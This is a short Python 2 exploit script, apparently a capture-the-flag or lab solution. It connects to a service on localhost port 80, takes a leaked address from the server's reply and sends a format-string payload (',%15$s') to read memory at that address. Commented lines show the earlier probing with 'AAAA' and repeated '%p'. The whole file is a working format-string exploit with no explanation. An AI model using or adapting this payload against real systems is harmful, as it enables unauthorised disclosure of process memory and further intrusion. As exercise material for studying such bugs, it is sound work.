#!/usr/bin/env python2

import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 80))
res = s.recv(4096)
res += s.recv(4096)
print(res)
addr = int(res.split()[4],16)
#buf = "AAAA"
buf = struct.pack("<I", addr)
#buf += ',%p' * 20
buf += ',%15$s'

buf += '\n'
s.send(buf)
print(buf)
res = s.recv(4096)
res += s.recv(4096)
res += s.recv(4096)
print(res)
s.close()
